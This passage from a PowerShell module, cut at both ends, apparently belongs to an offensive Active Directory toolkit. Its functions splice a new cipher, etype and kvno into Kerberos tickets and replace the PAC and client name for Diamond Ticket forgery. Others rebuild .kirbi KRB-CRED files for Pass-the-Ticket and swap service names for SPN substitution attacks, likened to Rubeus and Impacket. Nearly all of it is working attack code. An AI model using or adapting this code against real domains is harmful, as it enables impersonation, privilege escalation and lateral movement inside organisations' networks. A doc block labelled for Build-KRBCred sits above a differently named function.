                $result.EndTime = Read-ASN1GeneralizedTime -Content $timeEl.Content
            }
            8 {
                # renew-till [8] KerberosTime OPTIONAL
                $timeEl = Read-ASN1Element -Data $child.Content -Offset 0
                $result.RenewTill = Read-ASN1GeneralizedTime -Content $timeEl.Content
            }
            9 {
                # caddr [9] HostAddresses OPTIONAL
                $result.ClientAddresses = $child.Content
            }
            10 {
                # authorization-data [10] AuthorizationData OPTIONAL
                $result.AuthorizationData = $child.Content

                # Try to extract PAC from authorization data
                $pac = Extract-PACFromAuthData -AuthDataBytes $child.Content
                if ($pac) {
                    $result.PAC = $pac
                }
            }
        }
    }

    return $result
}

<#
.SYNOPSIS
    Replaces the cipher bytes in a Kerberos Ticket while preserving the rest.
.DESCRIPTION
    Performs in-place replacement of the EncryptedData cipher field [2] within
    a Ticket's enc-part [3]. All other fields (tkt-vno, realm, sname, etype, kvno)
    are preserved byte-for-byte from the original KDC-generated ticket.
.PARAMETER OriginalTicketBytes
    The original raw Ticket bytes (APPLICATION 1).
.PARAMETER NewCipher
    The new ciphertext to replace the existing cipher.
#>
function Update-TicketCipher {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$OriginalTicketBytes,

        [Parameter(Mandatory=$true)]
        [byte[]]$NewCipher,

        [Parameter(Mandatory=$false)]
        [int]$NewKvno = -1,

        [Parameter(Mandatory=$false)]
        [int]$NewEType = -1
    )

    # Parse APPLICATION 1 outer tag
    $app1 = Read-ASN1Element -Data $OriginalTicketBytes -Offset 0

    # Parse inner SEQUENCE
    $seq = Read-ASN1Element -Data $app1.Content -Offset 0
    $children = Read-ASN1Children -Data $seq.Content

    # Walk through children, replace cipher in [3] enc-part
    $seqContent = $seq.Content
    $newSeqParts = New-Object System.Collections.Generic.List[byte]
    $pos = 0

    foreach ($child in $children) {
        $contextTag = $child.Tag -band 0x1F
        $rawBytes = [byte[]]$seqContent[$pos..($pos + $child.TotalLength - 1)]

        if ($contextTag -eq 3) {
            # enc-part [3] EncryptedData - replace cipher, optionally update etype/kvno
            $encDataSeq = Read-ASN1Element -Data $child.Content -Offset 0
            $encDataChildren = Read-ASN1Children -Data $encDataSeq.Content

            $newEncDataParts = New-Object System.Collections.Generic.List[byte]
            $edPos = 0

            foreach ($edChild in $encDataChildren) {
                $edTag = $edChild.Tag -band 0x1F
                $edRawBytes = [byte[]]$encDataSeq.Content[$edPos..($edPos + $edChild.TotalLength - 1)]

                if ($edTag -eq 0 -and $NewEType -ge 0) {
                    # etype [0] Int32 - update with new etype
                    $newETypeField = [byte[]](New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $NewEType))
                    $newEncDataParts.AddRange($newETypeField)
                    Write-Verbose "[Update-TicketCipher] Updated etype to $NewEType"
                }
                elseif ($edTag -eq 1 -and $NewKvno -ge 0) {
                    # kvno [1] UInt32 OPTIONAL - update with new kvno
                    $newKvnoField = [byte[]](New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value $NewKvno))
                    $newEncDataParts.AddRange($newKvnoField)
                    Write-Verbose "[Update-TicketCipher] Updated kvno to $NewKvno"
                }
                elseif ($edTag -eq 2) {
                    # cipher [2] OCTET STRING - replace with new cipher
                    $newCipherField = [byte[]](New-ASN1ContextTag -Tag 2 -Data (New-ASN1OctetString -Value $NewCipher))
                    $newEncDataParts.AddRange($newCipherField)
                } else {
                    # Preserve original field as-is
                    $newEncDataParts.AddRange($edRawBytes)
                }

                $edPos += $edChild.TotalLength
            }

            # Rebuild EncryptedData SEQUENCE and context tag [3]
            $newEncData = [byte[]](New-ASN1Sequence -Data ([byte[]]$newEncDataParts.ToArray()))
            $newEncPart = [byte[]](New-ASN1ContextTag -Tag 3 -Data $newEncData)
            $newSeqParts.AddRange($newEncPart)
        } else {
            # Preserve [0] tkt-vno, [1] realm, [2] sname as original raw bytes
            $newSeqParts.AddRange($rawBytes)
        }

        $pos += $child.TotalLength
    }

    # Rebuild SEQUENCE and APPLICATION 1 wrappers
    $newSeq = [byte[]](New-ASN1Sequence -Data ([byte[]]$newSeqParts.ToArray()))
    $newTicket = [byte[]](New-ASN1ApplicationTag -Tag 1 -Data $newSeq)

    return $newTicket
}

<#
.SYNOPSIS
    Updates the PAC and optionally client name in a decrypted EncTicketPart.
.DESCRIPTION
    Performs in-place binary replacement of the authorization-data (PAC) and
    optionally the cname field in a decrypted EncTicketPart. All other fields
    (flags, key, crealm, transited, times, caddr) are preserved byte-for-byte
    from the original KDC-generated EncTicketPart.

    This is critical for Diamond Tickets because rebuilding the EncTicketPart
    from scratch can introduce subtle ASN.1 encoding differences that cause
    the KDC to reject the ticket.
.PARAMETER EncTicketPartBytes
    The original decrypted EncTicketPart bytes (starting with APPLICATION 3 tag).
.PARAMETER NewPACData
    The modified PAC data to replace the existing PAC.
.PARAMETER NewClientName
    Optional new client name to replace the existing cname.
#>
function Update-EncTicketPartPAC {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$EncTicketPartBytes,

        [Parameter(Mandatory=$true)]
        [byte[]]$NewPACData,

        [Parameter(Mandatory=$false)]
        [string]$NewClientName
    )

    # Parse APPLICATION 3 outer tag
    $app3 = Read-ASN1Element -Data $EncTicketPartBytes -Offset 0
    if (($app3.Tag -band 0x1F) -ne 3) {
        throw "Invalid EncTicketPart: Expected APPLICATION 3, got tag 0x$($app3.Tag.ToString('X2'))"
    }

    # Parse inner SEQUENCE
    $seq = Read-ASN1Element -Data $app3.Content -Offset 0
    $children = Read-ASN1Children -Data $seq.Content

    # Walk through children, collect raw bytes, replace [3] cname and [10] authorization-data
    $seqContent = $seq.Content
    $newSeqParts = New-Object System.Collections.Generic.List[byte]
    $pos = 0

    foreach ($child in $children) {
        $contextTag = $child.Tag -band 0x1F
        $rawBytes = [byte[]]$seqContent[$pos..($pos + $child.TotalLength - 1)]

        if ($contextTag -eq 3 -and $NewClientName) {
            # Replace cname [3] PrincipalName with new client name
            # PrincipalName ::= SEQUENCE { name-type [0] INT32, name-string [1] SEQUENCE OF GeneralString }
            $cnameContent = New-Object System.Collections.Generic.List[byte]
            $cnameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 1)))  # NT-PRINCIPAL
            $cnameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 1 -Data (New-ASN1Sequence -Data (New-ASN1GeneralString -Value $NewClientName))))
            $newCname = [byte[]](New-ASN1ContextTag -Tag 3 -Data (New-ASN1Sequence -Data ([byte[]]$cnameContent.ToArray())))
            $newSeqParts.AddRange($newCname)
        }
        elseif ($contextTag -eq 10) {
            # Replace authorization-data [10] with new PAC
            $newAuthzData = New-PACAuthorizationData -PACData $NewPACData
            $newAuthzField = [byte[]](New-ASN1ContextTag -Tag 10 -Data $newAuthzData)
            $newSeqParts.AddRange($newAuthzField)
        }
        else {
            # Preserve original bytes exactly
            $newSeqParts.AddRange($rawBytes)
        }

        $pos += $child.TotalLength
    }

    # Rebuild SEQUENCE and APPLICATION 3 wrappers
    $newSeq = [byte[]](New-ASN1Sequence -Data ([byte[]]$newSeqParts.ToArray()))
    $newEncTicketPart = [byte[]](New-ASN1ApplicationTag -Tag 3 -Data $newSeq)

    return $newEncTicketPart
}

<#
.SYNOPSIS
    Extracts PAC from AuthorizationData structure.
#>
function Extract-PACFromAuthData {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$AuthDataBytes
    )

    try {
        # AuthorizationData ::= SEQUENCE OF SEQUENCE { ad-type, ad-data }
        $seqElement = Read-ASN1Element -Data $AuthDataBytes -Offset 0
        $adEntries = Read-ASN1Children -Data $seqElement.Content

        foreach ($adEntry in $adEntries) {
            $entrySeq = $adEntry
            $entryChildren = Read-ASN1Children -Data $entrySeq.Content

            $adType = 0
            $adData = $null

            foreach ($entryChild in $entryChildren) {
                $entryTag = $entryChild.Tag -band 0x1F
                if ($entryTag -eq 0) {
                    # ad-type [0] Int32
                    $typeEl = Read-ASN1Element -Data $entryChild.Content -Offset 0
                    $adType = Read-ASN1Integer -Content $typeEl.Content
                }
                elseif ($entryTag -eq 1) {
                    # ad-data [1] OCTET STRING
                    $dataEl = Read-ASN1Element -Data $entryChild.Content -Offset 0
                    $adData = $dataEl.Content
                }
            }

            # AD-IF-RELEVANT (1) contains nested authorization data
            if ($adType -eq 1 -and $adData) {
                $nestedPac = Extract-PACFromAuthData -AuthDataBytes $adData
                if ($nestedPac) {
                    return $nestedPac
                }
            }

            # AD-WIN2K-PAC (128) contains the actual PAC
            if ($adType -eq 128 -and $adData) {
                return $adData
            }
        }

        return $null
    }
    catch {
        Write-Log "[Extract-PACFromAuthData] Error: $_" -Level Error
        return $null
    }
}

#endregion

#region KRB-CRED Builder

<#
.SYNOPSIS
    Builds a KRB-CRED structure for kirbi file export.

.DESCRIPTION
    Creates a proper KRB-CRED (APPLICATION 22) structure that includes both the
    ticket and the session key. This format is required for Pass-the-Ticket (PTT)
    because the session key is needed to decrypt the service ticket.

    The raw ticket (APPLICATION 1) alone is NOT sufficient for PTT.

.PARAMETER Ticket
    The raw ticket bytes (APPLICATION 1 - Ticket structure per RFC 4120).

.PARAMETER SessionKey
    The session key bytes from the encrypted part.

.PARAMETER SessionKeyType
    The encryption type of the session key (17=AES128, 18=AES256, 23=RC4).

.PARAMETER Realm
    The Kerberos realm (domain name in uppercase).

.PARAMETER ClientName
    The client principal name (sAMAccountName).

.PARAMETER ServerName
    The server principal name (e.g., "krbtgt" for TGT).

.PARAMETER ServerInstance
    The server instance (e.g., realm for TGT, hostname for service ticket).

.PARAMETER StartTime
    Optional start time for the ticket. Defaults to now.

.PARAMETER EndTime
    Optional end time for the ticket. Defaults to 10 hours from now.

.PARAMETER RenewTill
    Optional renewal time for the ticket. Defaults to 7 days from now.

.OUTPUTS
    [byte[]] The KRB-CRED structure as a byte array, ready to write to .kirbi file.

.EXAMPLE
    $krbCred = Build-KRBCred -Ticket $ticket -SessionKey $key -SessionKeyType 18 `
                              -Realm "CONTOSO.COM" -ClientName "admin" `
                              -ServerName "krbtgt" -ServerInstance "CONTOSO.COM"
    [IO.File]::WriteAllBytes("ticket.kirbi", $krbCred)

.NOTES
    KRB-CRED structure (RFC 4120):
    KRB-CRED ::= [APPLICATION 22] SEQUENCE {
        pvno [0] INTEGER (5),
        msg-type [1] INTEGER (22),
        tickets [2] SEQUENCE OF Ticket,
        enc-part [3] EncryptedData -- EncKrbCredPart
    }

    EncKrbCredPart ::= [APPLICATION 29] SEQUENCE {
        ticket-info [0] SEQUENCE OF KrbCredInfo
    }
#>
function Update-KRBCredTicket {
    <#
    .SYNOPSIS
        Replaces the Ticket and optionally the client name in an existing KRB-CRED.
    .DESCRIPTION
        In-place modification of a KRB-CRED structure (like Rubeus ModifyTicket).
        The Ticket bytes (APPLICATION 1) inside [2] tickets are replaced.
        If NewClientName is provided, the pname in EncKrbCredPart is also updated
        while preserving the session key and all other fields as raw bytes.
        This guarantees the session key in the KRB-CRED matches what was originally issued.
    .PARAMETER OriginalKRBCred
        The original KRB-CRED bytes (.kirbi format).
    .PARAMETER NewTicket
        The new Ticket bytes (APPLICATION 1) to replace the original.
    .PARAMETER NewClientName
        Optional new client name to set in the EncKrbCredPart pname field.
        If not provided, the original pname is preserved byte-for-byte.
    .OUTPUTS
        [byte[]] Modified KRB-CRED with new ticket and optionally updated pname.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$OriginalKRBCred,

        [Parameter(Mandatory=$true)]
        [byte[]]$NewTicket,

        [Parameter(Mandatory=$false)]
        [string]$NewClientName
    )

    # Parse APPLICATION 22 outer tag
    $app22 = Read-ASN1Element -Data $OriginalKRBCred -Offset 0
    if ($app22.Tag -ne 0x76) {
        throw "Invalid KRB-CRED: Expected APPLICATION 22, got 0x$($app22.Tag.ToString('X2'))"
    }

    # Parse inner SEQUENCE
    $seq = Read-ASN1Element -Data $app22.Content -Offset 0
    if ($seq.Tag -ne 0x30) {
        throw "Invalid KRB-CRED: Expected SEQUENCE, got 0x$($seq.Tag.ToString('X2'))"
    }

    # Extract all 4 children as raw byte ranges from the SEQUENCE content
    # Note: Read-ASN1Children uses Write-Output -NoEnumerate, so do NOT wrap in @()
    # which would create a nested array (1 element containing the inner array)
    $children = Read-ASN1Children -Data $seq.Content
    if ($children.Count -lt 4) {
        throw "Invalid KRB-CRED: Expected 4 children, got $($children.Count)"
    }

    # Reconstruct raw bytes for each child from SEQUENCE content
    $seqContent = $seq.Content
    $childRawBytes = @()
    $pos = 0
    for ($i = 0; $i -lt $children.Count; $i++) {
        $totalLen = $children[$i].TotalLength
        $childRawBytes += ,([byte[]]$seqContent[$pos..($pos + $totalLen - 1)])
        $pos += $totalLen
    }

    # child[0] = [0] pvno       → keep original
    # child[1] = [1] msg-type   → keep original
    # child[2] = [2] tickets    → replace with new ticket
    # child[3] = [3] enc-part   → modify pname if NewClientName provided, preserve rest

    # Build new [2] tickets: context tag 2 wrapping SEQUENCE OF Ticket
    $newTicketsField = [byte[]](New-ASN1ContextTag -Tag 2 -Data (New-ASN1Sequence -Data $NewTicket))

    # Handle enc-part [3]: either modify pname or keep original
    $encPartField = $childRawBytes[3]
    if ($NewClientName) {
        $encPartField = Update-KRBCredEncPartPName -EncPartRawBytes ([byte[]]$childRawBytes[3]) -NewClientName $NewClientName
    }

    # Reassemble KRB-CRED SEQUENCE content
    $newSeqContent = New-Object System.Collections.Generic.List[byte]
    $newSeqContent.AddRange([byte[]]$childRawBytes[0])   # [0] pvno - original
    $newSeqContent.AddRange([byte[]]$childRawBytes[1])   # [1] msg-type - original
    $newSeqContent.AddRange([byte[]]$newTicketsField)     # [2] tickets - NEW
    $newSeqContent.AddRange([byte[]]$encPartField)        # [3] enc-part - modified pname or original

    # Wrap in SEQUENCE and APPLICATION 22
    $newSeq = [byte[]](New-ASN1Sequence -Data ([byte[]]$newSeqContent.ToArray()))
    $newKrbCred = [byte[]](New-ASN1ApplicationTag -Tag 22 -Data $newSeq)

    Write-Verbose "[Update-KRBCredTicket] Original KRB-CRED: $($OriginalKRBCred.Length) bytes, New KRB-CRED: $($newKrbCred.Length) bytes"
    if ($NewClientName) {
        Write-Verbose "[Update-KRBCredTicket] Updated pname in EncKrbCredPart to: $NewClientName"
    }

    return $newKrbCred
}

function Update-KRBCredEncPartPName {
    <#
    .SYNOPSIS
        Updates the pname field in a KRB-CRED enc-part [3] while preserving all other fields as raw bytes.
    .DESCRIPTION
        Parses the enc-part context tag [3] → EncryptedData → cipher → EncKrbCredPart [APPLICATION 29]
        → KrbCredInfo SEQUENCE, then replaces only the [2] pname field with the new client name.
        All other fields (especially [0] key = session key) are preserved as raw bytes.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$EncPartRawBytes,

        [Parameter(Mandatory=$true)]
        [string]$NewClientName
    )

    # Parse context tag [3] → content is EncryptedData SEQUENCE
    $ctxTag3 = Read-ASN1Element -Data $EncPartRawBytes -Offset 0

    # Parse EncryptedData SEQUENCE: { [0] etype, [2] cipher }
    $encDataSeq = Read-ASN1Element -Data $ctxTag3.Content -Offset 0
    $encDataChildren = Read-ASN1Children -Data $encDataSeq.Content

    # Find cipher field [2] containing the EncKrbCredPart
    $cipherContent = $null
    $etypeRawBytes = $null
    $encDataSeqContent = $encDataSeq.Content
    $edPos = 0
    $edChildRaw = @()
    for ($i = 0; $i -lt $encDataChildren.Count; $i++) {
        $edChildRaw += ,([byte[]]$encDataSeqContent[$edPos..($edPos + $encDataChildren[$i].TotalLength - 1)])
        $tagNum = $encDataChildren[$i].Tag -band 0x1F
        if ($tagNum -eq 2) {
            # [2] cipher - OCTET STRING containing EncKrbCredPart
            $cipherOctet = Read-ASN1Element -Data $encDataChildren[$i].Content -Offset 0
            $cipherContent = $cipherOctet.Content
        }
        $edPos += $encDataChildren[$i].TotalLength
    }

    if (-not $cipherContent) {
        throw "Update-KRBCredEncPartPName: cipher field [2] not found in EncryptedData"
    }

    # Parse EncKrbCredPart [APPLICATION 29] → SEQUENCE → [0] ticket-info → SEQUENCE OF KrbCredInfo
    $app29 = Read-ASN1Element -Data $cipherContent -Offset 0
    $app29Seq = Read-ASN1Element -Data $app29.Content -Offset 0
    $app29Children = Read-ASN1Children -Data $app29Seq.Content

    # Find [0] ticket-info
    $ticketInfoChild = $null
    foreach ($child in $app29Children) {
        if (($child.Tag -band 0x1F) -eq 0) {
            $ticketInfoChild = $child
            break
        }
    }

    if (-not $ticketInfoChild) {
        throw "Update-KRBCredEncPartPName: ticket-info [0] not found in EncKrbCredPart"
    }

    # Parse SEQUENCE OF KrbCredInfo → get first KrbCredInfo SEQUENCE
    $ticketInfoSeq = Read-ASN1Element -Data $ticketInfoChild.Content -Offset 0
    $credInfoElements = Read-ASN1Children -Data $ticketInfoSeq.Content

    # First element is our KrbCredInfo SEQUENCE
    $credInfoSeq = $credInfoElements[0]
    $credInfoChildren = Read-ASN1Children -Data $credInfoSeq.Content

    # Walk through KrbCredInfo fields, extract raw bytes, replace [2] pname
    $credInfoSeqContent = $credInfoSeq.Content
    $ciPos = 0
    $newCredInfoContent = New-Object System.Collections.Generic.List[byte]

    for ($i = 0; $i -lt $credInfoChildren.Count; $i++) {
        $fieldLen = $credInfoChildren[$i].TotalLength
        $fieldRaw = [byte[]]$credInfoSeqContent[$ciPos..($ciPos + $fieldLen - 1)]
        $tagNum = $credInfoChildren[$i].Tag -band 0x1F

        if ($tagNum -eq 2) {
            # [2] pname - replace with new client name
            $cnameContent = New-Object System.Collections.Generic.List[byte]
            $cnameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 1)))  # NT-PRINCIPAL
            $cnameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 1 -Data (New-ASN1Sequence -Data (New-ASN1GeneralString -Value $NewClientName))))
            $newPname = [byte[]](New-ASN1ContextTag -Tag 2 -Data (New-ASN1Sequence -Data ([byte[]]$cnameContent.ToArray())))
            $newCredInfoContent.AddRange($newPname)
            Write-Verbose "[Update-KRBCredEncPartPName] Replaced pname [2]: $($fieldRaw.Length) bytes -> $($newPname.Length) bytes"
        } else {
            # All other fields: preserve raw bytes (session key, realm, flags, times, sname)
            $newCredInfoContent.AddRange($fieldRaw)
        }

        $ciPos += $fieldLen
    }

    # Rebuild: KrbCredInfo SEQUENCE → SEQUENCE OF → [0] ticket-info → EncKrbCredPart SEQUENCE → APPLICATION 29
    $newCredInfoSeq = [byte[]](New-ASN1Sequence -Data ([byte[]]$newCredInfoContent.ToArray()))
    $newTicketInfoSeq = [byte[]](New-ASN1Sequence -Data $newCredInfoSeq)
    $newTicketInfoField = [byte[]](New-ASN1ContextTag -Tag 0 -Data $newTicketInfoSeq)
    $newApp29Seq = [byte[]](New-ASN1Sequence -Data $newTicketInfoField)
    $newApp29 = [byte[]](New-ASN1ApplicationTag -Tag 29 -Data $newApp29Seq)

    # Rebuild EncryptedData: { [0] etype (original), [2] cipher (new EncKrbCredPart) }
    $newEncDataContent = New-Object System.Collections.Generic.List[byte]
    $edRebuildPos = 0
    for ($i = 0; $i -lt $encDataChildren.Count; $i++) {
        $edFieldLen = $encDataChildren[$i].TotalLength
        $tagNum = $encDataChildren[$i].Tag -band 0x1F
        if ($tagNum -eq 2) {
            # [2] cipher - wrap new EncKrbCredPart in OCTET STRING
            $newEncDataContent.AddRange([byte[]](New-ASN1ContextTag -Tag 2 -Data (New-ASN1OctetString -Value $newApp29)))
        } else {
            # Preserve other fields (etype, kvno) as raw bytes
            $rawField = [byte[]]$encDataSeqContent[$edRebuildPos..($edRebuildPos + $edFieldLen - 1)]
            $newEncDataContent.AddRange($rawField)
        }
        $edRebuildPos += $edFieldLen
    }
    $newEncDataSeq = [byte[]](New-ASN1Sequence -Data ([byte[]]$newEncDataContent.ToArray()))

    # Wrap in context tag [3]
    return [byte[]](New-ASN1ContextTag -Tag 3 -Data $newEncDataSeq)
}

function Update-KRBCredSName {
    <#
    .SYNOPSIS
        Substitutes the service name (sname) in a KRB-CRED structure (Alternative Service / altservice).
    .DESCRIPTION
        Modifies the sname in both the outer Ticket (APPLICATION 1, field [2]) and the
        EncKrbCredPart KrbCredInfo (field [9]) while preserving all other fields as raw bytes.

        This enables "SPN substitution" attacks: the encrypted ticket payload (EncTicketPart)
        does NOT contain sname, so modifying the cleartext sname routing label does not
        invalidate the ticket. The target service decrypts with its own key regardless of
        what sname says, as long as the same account key was used.

        Equivalent to Rubeus /altservice and Impacket tgssub.
    .PARAMETER KRBCredBytes
        The complete KRB-CRED bytes (.kirbi format).
    .PARAMETER NewServiceType
        The new service type to substitute (e.g., "cifs", "ldap", "http", "host").
    .PARAMETER NewHostName
        Optional new hostname. If not provided, the original hostname is preserved.
    .OUTPUTS
        [byte[]] Modified KRB-CRED with substituted sname in both Ticket and EncKrbCredPart.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$KRBCredBytes,

        [Parameter(Mandatory=$true)]
        [string]$NewServiceType,

        [Parameter(Mandatory=$false)]
        [string]$NewHostName
    )

    # =====================================================
    # Helper: Build a new PrincipalName (NT-SRV-INST=2)
    # =====================================================
    function Build-SNameBytes {
        param([string]$ServiceType, [string]$HostName)
        $snameContent = New-Object System.Collections.Generic.List[byte]
        # name-type [0] INTEGER = 2 (NT-SRV-INST)
        $snameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 2)))
        # name-string [1] SEQUENCE OF GeneralString
        $nameSeq = New-Object System.Collections.Generic.List[byte]
        $nameSeq.AddRange([byte[]](New-ASN1GeneralString -Value $ServiceType))
        $nameSeq.AddRange([byte[]](New-ASN1GeneralString -Value $HostName))
        $snameContent.AddRange([byte[]](New-ASN1ContextTag -Tag 1 -Data (New-ASN1Sequence -Data ([byte[]]$nameSeq.ToArray()))))
        return [byte[]](New-ASN1Sequence -Data ([byte[]]$snameContent.ToArray()))
    }

    # =====================================================
    # Helper: Extract hostname from an existing sname field
    # =====================================================
    function Extract-HostNameFromSName {
        param([byte[]]$SNameBytes)
        # Parse PrincipalName SEQUENCE -> find [1] name-string -> SEQUENCE OF GeneralString -> second element
        $snameSeq = Read-ASN1Element -Data $SNameBytes -Offset 0
        $snameChildren = Read-ASN1Children -Data $snameSeq.Content
        foreach ($child in $snameChildren) {
            $tagNum = $child.Tag -band 0x1F
            if ($tagNum -eq 1) {
                # [1] name-string: SEQUENCE OF GeneralString
                $nameStringSeq = Read-ASN1Element -Data $child.Content -Offset 0
                $nameElements = Read-ASN1Children -Data $nameStringSeq.Content
                $nameSeqContent = $nameStringSeq.Content
                $pos = 0
                $components = @()
                for ($i = 0; $i -lt $nameElements.Count; $i++) {
                    $elemLen = $nameElements[$i].TotalLength
                    $elemRaw = [byte[]]$nameSeqContent[$pos..($pos + $elemLen - 1)]
                    $elemParsed = Read-ASN1Element -Data $elemRaw -Offset 0
                    $components += [System.Text.Encoding]::ASCII.GetString($elemParsed.Content)
                    $pos += $elemLen
                }
                # Return hostname (second component for service/host SPNs)
                if ($components.Count -ge 2) {
                    return $components[1]
                } elseif ($components.Count -eq 1) {
                    return $components[0]
                }
            }
        }
        return $null
    }

    # =====================================================
    # Part 1: Parse KRB-CRED outer structure
    # =====================================================
    $app22 = Read-ASN1Element -Data $KRBCredBytes -Offset 0
    if ($app22.Tag -ne 0x76) {
        throw "Update-KRBCredSName: Expected APPLICATION 22 (KRB-CRED), got 0x$($app22.Tag.ToString('X2'))"
    }

    $seq = Read-ASN1Element -Data $app22.Content -Offset 0
    if ($seq.Tag -ne 0x30) {
        throw "Update-KRBCredSName: Expected SEQUENCE, got 0x$($seq.Tag.ToString('X2'))"
    }

    $children = Read-ASN1Children -Data $seq.Content
    if ($children.Count -lt 4) {
        throw "Update-KRBCredSName: Expected 4 children in KRB-CRED, got $($children.Count)"
    }

    # Extract raw bytes for each child
    $seqContent = $seq.Content
    $childRawBytes = @()
    $pos = 0
    for ($i = 0; $i -lt $children.Count; $i++) {
        $totalLen = $children[$i].TotalLength
        $childRawBytes += ,([byte[]]$seqContent[$pos..($pos + $totalLen - 1)])
        $pos += $totalLen
    }

    # =====================================================
    # Part 2: Modify Ticket sname [2] (outer Ticket structure)
    # =====================================================
    # child[2] = [2] tickets (context tag wrapping SEQUENCE OF Ticket)
    $ticketsCtx = Read-ASN1Element -Data ([byte[]]$childRawBytes[2]) -Offset 0
    # Parse SEQUENCE OF Ticket
    $ticketsSeq = Read-ASN1Element -Data $ticketsCtx.Content -Offset 0

    # First Ticket: APPLICATION 1
    $app1 = Read-ASN1Element -Data $ticketsSeq.Content -Offset 0
    $ticketSeq = Read-ASN1Element -Data $app1.Content -Offset 0
    $ticketChildren = Read-ASN1Children -Data $ticketSeq.Content

    # Extract raw bytes for ticket children
    $ticketSeqContent = $ticketSeq.Content
    $ticketChildRaw = @()
    $tPos = 0
    for ($i = 0; $i -lt $ticketChildren.Count; $i++) {
        $tLen = $ticketChildren[$i].TotalLength
        $ticketChildRaw += ,([byte[]]$ticketSeqContent[$tPos..($tPos + $tLen - 1)])
        $tPos += $tLen
    }

    # Determine hostname (from existing sname if not provided)
    $hostName = $NewHostName
    if (-not $hostName) {
        # Find [2] sname in ticket children and extract hostname
        for ($i = 0; $i -lt $ticketChildren.Count; $i++) {
            $tagNum = $ticketChildren[$i].Tag -band 0x1F
            if ($tagNum -eq 2) {
                # [2] sname - extract hostname from existing PrincipalName
                $hostName = Extract-HostNameFromSName -SNameBytes $ticketChildren[$i].Content
                break
            }
        }
    }

    if (-not $hostName) {
        throw "Update-KRBCredSName: Could not determine hostname from existing ticket sname"
    }

    Write-Verbose "[Update-KRBCredSName] Substituting sname to $NewServiceType/$hostName"

    # Build new sname PrincipalName
    $newSNameBytes = Build-SNameBytes -ServiceType $NewServiceType -HostName $hostName

    # Reassemble Ticket SEQUENCE with substituted sname [2]
    $newTicketContent = New-Object System.Collections.Generic.List[byte]
    for ($i = 0; $i -lt $ticketChildren.Count; $i++) {
        $tagNum = $ticketChildren[$i].Tag -band 0x1F
        if ($tagNum -eq 2) {
            # Replace [2] sname
            $newSnameField = [byte[]](New-ASN1ContextTag -Tag 2 -Data $newSNameBytes)
            $newTicketContent.AddRange($newSnameField)
        } else {
            # Preserve all other fields as raw bytes ([0] tkt-vno, [1] realm, [3] enc-part)
            $newTicketContent.AddRange([byte[]]$ticketChildRaw[$i])
        }
    }

    # Rebuild: Ticket SEQUENCE -> APPLICATION 1 -> SEQUENCE OF -> [2] tickets
    $newTicketSeq = [byte[]](New-ASN1Sequence -Data ([byte[]]$newTicketContent.ToArray()))
    $newApp1 = [byte[]](New-ASN1ApplicationTag -Tag 1 -Data $newTicketSeq)
    $newTicketsField = [byte[]](New-ASN1ContextTag -Tag 2 -Data (New-ASN1Sequence -Data $newApp1))

    # =====================================================
    # Part 3: Modify EncKrbCredPart sname [9] (KrbCredInfo)
    # =====================================================
    # Reuse the Update-KRBCredEncPartPName pattern but for tag [9]
    $encPartRawBytes = [byte[]]$childRawBytes[3]

    # Parse context tag [3] -> EncryptedData SEQUENCE
    $ctxTag3 = Read-ASN1Element -Data $encPartRawBytes -Offset 0
    $encDataSeq = Read-ASN1Element -Data $ctxTag3.Content -Offset 0
    $encDataChildren = Read-ASN1Children -Data $encDataSeq.Content

    # Extract raw bytes and find cipher [2]
    $encDataSeqContent = $encDataSeq.Content
    $edPos = 0
    $edChildRaw = @()
    $cipherContent = $null
    for ($i = 0; $i -lt $encDataChildren.Count; $i++) {
        $edChildRaw += ,([byte[]]$encDataSeqContent[$edPos..($edPos + $encDataChildren[$i].TotalLength - 1)])
        $tagNum = $encDataChildren[$i].Tag -band 0x1F
        if ($tagNum -eq 2) {
            $cipherOctet = Read-ASN1Element -Data $encDataChildren[$i].Content -Offset 0
            $cipherContent = $cipherOctet.Content
        }
        $edPos += $encDataChildren[$i].TotalLength
    }

    if (-not $cipherContent) {
        throw "Update-KRBCredSName: cipher field [2] not found in EncryptedData"
    }

    # Parse EncKrbCredPart [APPLICATION 29] -> SEQUENCE -> [0] ticket-info -> SEQUENCE OF KrbCredInfo
    $app29 = Read-ASN1Element -Data $cipherContent -Offset 0
    $app29Seq = Read-ASN1Element -Data $app29.Content -Offset 0
    $app29Children = Read-ASN1Children -Data $app29Seq.Content

    # Find [0] ticket-info
    $ticketInfoChild = $null
    foreach ($child in $app29Children) {
        if (($child.Tag -band 0x1F) -eq 0) {
            $ticketInfoChild = $child
            break
        }
    }

    if (-not $ticketInfoChild) {
        throw "Update-KRBCredSName: ticket-info [0] not found in EncKrbCredPart"
    }

    # Parse SEQUENCE OF KrbCredInfo -> first KrbCredInfo
    $ticketInfoSeq = Read-ASN1Element -Data $ticketInfoChild.Content -Offset 0
    $credInfoElements = Read-ASN1Children -Data $ticketInfoSeq.Content
    $credInfoSeq = $credInfoElements[0]
    $credInfoChildren = Read-ASN1Children -Data $credInfoSeq.Content

    # Walk KrbCredInfo fields, replace [9] sname
    $credInfoSeqContent = $credInfoSeq.Content
    $ciPos = 0
    $newCredInfoContent = New-Object System.Collections.Generic.List[byte]

    for ($i = 0; $i -lt $credInfoChildren.Count; $i++) {
        $fieldLen = $credInfoChildren[$i].TotalLength
        $fieldRaw = [byte[]]$credInfoSeqContent[$ciPos..($ciPos + $fieldLen - 1)]
        $tagNum = $credInfoChildren[$i].Tag -band 0x1F

        if ($tagNum -eq 9) {
            # [9] sname - replace with new service name
            $newSnameField9 = [byte[]](New-ASN1ContextTag -Tag 9 -Data $newSNameBytes)
            $newCredInfoContent.AddRange($newSnameField9)
